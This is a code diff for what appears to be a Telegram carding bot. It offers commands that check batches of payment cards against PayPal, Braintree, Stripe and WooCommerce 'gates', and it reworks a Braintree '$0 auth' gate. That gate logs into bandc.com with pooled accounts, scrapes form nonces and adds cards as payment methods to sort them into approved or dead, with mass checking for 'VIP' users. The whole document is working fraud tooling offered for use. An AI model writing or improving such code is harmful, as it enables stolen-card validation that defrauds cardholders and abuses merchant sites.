@@ -2297,8 +2297,8 @@ def cmds_command(message):
         f"  💰 /pp   » PayPal  <i>└ charge ${current_amount}</i>\n"
         "  🛡️ /vbv  » Braintree 3DS Single  <i>└ $2.00 auth</i>\n"
         "  🛡️ /vbvm » Braintree 3DS Mass  <i>└ up to 500 cards</i>\n"
-        "  🟢 /b3   » Braintree $0 Auth  <i>└ bandc gate · no charge</i>\n"
-        "  🔵 /wcs  » WooCommerce Stripe Auth  <i>└ any wcpay site · $0</i>\n"
+        "  🟢 /b3   » Braintree $0 Auth  <i>└ bandc gate · $0 · no charge on card</i>\n"
+        "  🔵 /wcs  » WooCommerce Stripe Auth  <i>└ /wcs https://site.com card · $0</i>\n"
         "  ⚡ /st   » Stripe Charge  <i>└ direct · ultra fast</i>\n"
         "  🔐 /sa   » Stripe Auth Only  <i>└ no charge</i>\n"
         "  🚀 /stm  » Stripe Mass  <i>└ multiple cards</i>\n"
@@ -5591,15 +5591,38 @@ def _b3_call(card: str):
         if not logen:
             return {"status": "error", "message": "Login nonce not found", "elapsed": round(time.time()-t0,2)}
 
-        # Step 2: Login
-        session.post('https://bandc.com/my-account/', headers={
+        # Step 2: Login — with verification
+        login_r = session.post('https://bandc.com/my-account/', headers={
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/', 'user-agent': ua
         }, data={
             'username': email, 'password': password,
             'woocommerce-login-nonce': logen.group(1),
-            '_wp_http_referer': '/my-account/', 'login': 'Login',
+            '_wp_http_referer': '/my-account/', 'login': 'Log in',
         }, timeout=20)
+
+        # Verify login succeeded
+        _is_logged_in = (
+            'woocommerce-login-nonce' not in login_r.text and
+            ('dashboard' in login_r.text.lower() or
+             'orders' in login_r.text.lower() or
+             'log out' in login_r.text.lower() or
+             'my-account' in login_r.url)
+        )
+        if not _is_logged_in:
+            # Try "login" as submit value as well
+            login_r2 = session.post('https://bandc.com/my-account/', headers={
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/', 'user-agent': ua
+            }, data={
+                'username': email, 'password': password,
+                'woocommerce-login-nonce': logen.group(1),
+                '_wp_http_referer': '/my-account/', 'login': 'Login',
+            }, timeout=20)
+            _is_logged_in = 'woocommerce-login-nonce' not in login_r2.text
+
+        if not _is_logged_in:
+            return {"status": "error", "message": "Login failed — account may be locked/expired", "elapsed": round(time.time()-t0,2)}
 
         # Step 3: Update billing address
         r = session.get('https://bandc.com/my-account/edit-address/billing/', timeout=20)
@@ -5621,10 +5644,29 @@ def _b3_call(card: str):
 
         # Step 4: Get Braintree client token
         r = session.get('https://bandc.com/my-account/add-payment-method/', timeout=20)
-        ct_nonce  = _re.search(r'client_token_nonce":"([^"]+)"', r.text)
-        add_nonce = _re.search(r'name="_wpnonce" value="(.*?)"', r.text)
-        if not ct_nonce or not add_nonce:
-            return {"status": "error", "message": "Could not get client token nonce", "elapsed": round(time.time()-t0,2)}
+        pg = r.text
+
+        # Try multiple nonce patterns (plugin may output in different formats)
+        ct_nonce = (
+            _re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', pg) or
+            _re.search(r"'client_token_nonce'\s*:\s*'([^']+)'", pg) or
+            _re.search(r'client_token_nonce[^:]*:\\?"([^"\\]+)', pg) or
+            _re.search(r'nonce["\s]*:\s*"([a-f0-9]{8,})"', pg)
+        )
+        # Try multiple _wpnonce patterns
+        add_nonce = (
+            _re.search(r'name="_wpnonce"\s+value="([^"]+)"', pg) or
+            _re.search(r'name="_wpnonce" value="([^"]+)"', pg) or
+            _re.search(r'"_wpnonce"\s*value="([^"]+)"', pg)
+        )
+
+        # If still not found, user may not be on the right page - give useful error
+        if not ct_nonce:
+            if 'woocommerce-login-nonce' in pg:
+                return {"status": "error", "message": "Session expired — re-login failed", "elapsed": round(time.time()-t0,2)}
+            return {"status": "error", "message": "Braintree not active on bandc — check accounts", "elapsed": round(time.time()-t0,2)}
+        if not add_nonce:
+            return {"status": "error", "message": "Add-payment-method nonce missing", "elapsed": round(time.time()-t0,2)}
 
         r2 = session.post('https://bandc.com/wp-admin/admin-ajax.php', headers={
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -5723,11 +5765,20 @@ def b3_command(message):
         cards = _get_cards_from_message(message)
         if not cards:
             bot.reply_to(message,
-                "<b>🟢 Braintree $0 Auth — bandc gate\n\n"
-                "📌 Usage:\n"
-                "/b3 4111111111111111|12|26|123\n\n"
-                "📌 Mass (one per line):\n"
-                "/b3\ncard1\ncard2\ncard3</b>", parse_mode='HTML')
+                "<b>🟢 Braintree $0 Auth  ❯  bandc.com Gate\n"
+                "━━━━━━━━━━━━━━━━\n"
+                "💡 <i>$0 charge · card stays clean · instant result</i>\n\n"
+                "📌 Single card:\n"
+                "<code>/b3 4111111111111111|12|26|123</code>\n\n"
+                "📌 Multi card (max 50):\n"
+                "<code>/b3\n"
+                "4111111111111111|12|26|123\n"
+                "5218071175156668|02|26|574</code>\n\n"
+                "📊 Results:\n"
+                "✅ Approved  ❌ Dead  🔴 Error\n"
+                "━━━━━━━━━━━━━━━━\n"
+                "⚠️ <i>VIP only · uses bandc.com pool accounts</i></b>",
+                parse_mode='HTML')
             return
 
         if len(cards) > 50:
